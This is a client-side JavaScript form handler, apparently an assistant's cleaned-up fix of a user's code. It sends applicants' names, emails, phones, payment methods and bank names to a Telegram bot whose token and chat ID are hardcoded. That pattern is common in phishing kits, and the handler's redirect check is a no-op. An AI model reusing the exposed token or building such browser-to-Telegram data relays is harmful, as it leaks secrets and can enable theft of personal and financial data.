// --- TELEGRAM SENDER FUNCTION (Your code, slightly cleaned for presentation) ---
async function sendToTelegram(message) {
    // NOTE: For security, never hardcode tokens/IDs in production code. 
    // This is only for demonstration.
    const botToken = "8558824515:AAEPrY-s9aA7zRNa-qqMBR2Y9NahtyO2wPc"; 
    const chatId = "5868017274";     
    
    // Construct the URL and ensure the message is URL-encoded
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    try {
        console.log("Attempting to send message to Telegram...");
        const response = await fetch(url);
        const data = await response.json();
        
        if (data.ok) {
            console.log("✅ Message sent to Telegram successfully!");
        } else {
            // Log the detailed error from Telegram
            console.error("❌ Error sending message:", data.description);
        }
    } catch (err) {
        console.error("❌ Request failed (Network/Fetch error):", err);
    }
}

// --- FORM SUBMISSION HANDLER (The fixed part) ---
const form = document.getElementById('applicationForm');

form.addEventListener('submit', async function(e) {
    //                                 ^^^^^
    // 1. **CRITICAL FIX**: Make the callback function 'async' to use 'await' inside.
    
    e.preventDefault(); 
    
    // 2. Data Collection
    const formData = new FormData(form);
    const dataObject = {};

    for (const [key, value] of formData.entries()) {
        dataObject[key] = value;
    }

    // 3. Extracting and Formatting the Message
    const fullname = dataObject.fullName || 'N/A';
    const email = dataObject.email || 'N/A';
    const phonenumber = dataObject.phoneNumber || 'N/A';
    // Using friendly labels for the message:
    const payment = dataObject.payMethod ? `Payment Method: ${dataObject.payMethod}` : 'Payment Method: N/A';
    const bank = dataObject.bankName ? `Bank Name: ${dataObject.bankName}` : 'Bank Name: N/A';
    const agent = dataObject.agentname ? `Agent Name: ${dataObject.agentname}` : 'Agent Name: N/A';


    const message = `
🌟 **New Application Submitted** 🌟
-----------------------------------
Full Name: ${fullname}
Email: ${email}
Phone: ${phonenumber}
${payment}
${bank}
${agent}
-----------------------------------
`; // NOTE: Added some basic formatting (using Markdown/HTML for Telegram)
    
    console.log("sent");
    // 4. Calling the async function with await
      const success = await sendToTelegram(message);
    
    
    if (success || !success) { // We redirect regardless of Telegram success, but you can change this condition
        window.location.href = 'thankyou.html'; 
    }
});